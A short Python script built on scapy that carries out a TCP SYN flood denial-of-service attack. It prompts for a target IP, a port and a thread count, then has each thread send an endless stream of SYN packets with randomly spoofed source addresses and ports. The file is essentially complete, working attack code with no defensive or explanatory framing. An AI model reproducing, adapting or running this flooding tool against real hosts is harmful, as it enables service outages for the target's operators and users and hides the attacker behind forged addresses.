import random
import threading

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


def get_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def get_port():
    port = random.randint(1000, 4600)
    return port


def syn_flood(source_ip, source_port, destination_ip, destination_port):
    ip = IP(src=source_ip, dst=destination_ip, flags=0x02)
    tcp = TCP(sport=source_port, dport=destination_port)

    pkt = ip / tcp

    send(pkt, verbose=False)


class Attack(threading.Thread):
    def __init__(self, threadID, destinationIP, destinationPORT):
        threading.Thread.__init__(self)
        self.ThreadID = threadID
        self.packages = 0
        self.destinationIP = destinationIP
        self.destinationPORT = destinationPORT

    def run(self):
        print(f"starting Thread - {self.ThreadID}")
        while True:
            try:

                syn_flood(source_ip=get_ip(), source_port=get_port(), destination_ip=self.destinationIP,
                          destination_port=self.destinationPORT)

                self.packages += 1

                if (self.packages % log_every_package) == 0:
                    print(f"Thread {self.ThreadID} sended {self.packages} in ... time \n ")

            except KeyboardInterrupt:
                print(" [ Notice ] CTRL + C Detected Canceling SYN ATTACK")


if __name__ == '__main__':

    # Gather input

    target_ip = str(input(" [ Input ] Please insert Target ip = "))
    target_port = int(input(" [ Input ] Please Insert Target port = "))
    threads = int(input(" [ Input ] please insert how many threads = "))
    log_every_package = int(input(" [ Input ] Please insert when you wanne log a package "))

    x = 1

    while x <= threads:
        thread = Attack(x, target_ip, target_port)
        thread.start()
        x += 1
